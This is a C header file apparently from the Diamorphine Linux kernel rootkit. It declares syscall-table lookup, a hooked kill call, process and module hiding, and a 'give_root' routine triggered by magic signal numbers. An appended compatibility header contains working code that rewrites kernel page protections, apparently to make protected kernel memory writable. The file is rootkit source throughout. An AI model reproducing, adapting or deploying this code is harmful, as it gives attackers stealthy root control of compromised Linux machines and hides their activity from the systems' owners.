unsigned long
resolve_sym(char *symbol);

unsigned long *
get_syscall_table_bf(void);

struct task_struct *
find_task(pid_t pid);
int
is_invisible(pid_t pid);

void
give_root(void);

void
module_show(void);

void
module_hide(void);

#if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0)
asmlinkage long
hacked_kill(const struct pt_regs *pt_regs);
#else
asmlinkage long
hacked_kill(pid_t pid, int sig);
#endif
struct linux_dirent {
        unsigned long   d_ino;
        unsigned long   d_off;
        unsigned short  d_reclen;
        char            d_name[1];
};

#define MAGIC_PREFIX "diamorphine_secret"

#define PF_INVISIBLE 0x01000000

#define MODULE_NAME "diamorphine"

enum {
	SIGINVIS = 31,
	SIGSUPER = 64,
	SIGMODINVIS = 63,
};

#ifndef IS_ENABLED
#define IS_ENABLED(option) \
(defined(__enabled_ ## option) || defined(__enabled_ ## option ## _MODULE))
#endif

#if LINUX_VERSION_CODE >= KERNEL_VERSION(5,7,0)
#define KPROBE_LOOKUP 1
#include <linux/kprobes.h>
static struct kprobe kp = {
	    .symbol_name = "kallsyms_lookup_name"
};
#endif


/* compat_update_mapping_prot.h */
#pragma once

#include <linux/mm.h>
#include <linux/pgtable.h>
#include <linux/vmalloc.h>

struct prot_update_data {
    pgprot_t prot;
};

static int update_pte_callback(pte_t *ptep, unsigned long addr,
                                void *data)
{
    struct prot_update_data *d = data;
    pte_t old_pte = READ_ONCE(*ptep);
    pte_t new_pte;

    if (!pte_present(old_pte))
        return 0;

    new_pte = pfn_pte(pte_pfn(old_pte), d->prot);

    set_pte(ptep, new_pte);

    return 0;
}

static inline int compat_update_mapping_prot(phys_addr_t phys,
                                              unsigned long virt,
                                              phys_addr_t size,
                                              pgprot_t prot)
{
    struct prot_update_data data = { .prot = prot };
    int ret;

    if (!size)
        return 0;

    WARN_ON(!virt || virt < PAGE_OFFSET);

    ret = apply_to_page_range(&init_mm, virt, size,
                              update_pte_callback, &data);
    if (ret)
        return ret;

    flush_tlb_kernel_range(virt, virt + size);

    if (pgprot_val(prot) & PTE_VALID) {
#ifdef CONFIG_ARM64
    if (!(pgprot_val(prot) & PTE_PXN))
        flush_icache_range(virt, virt + size);
#endif
    }

    return 0;
}
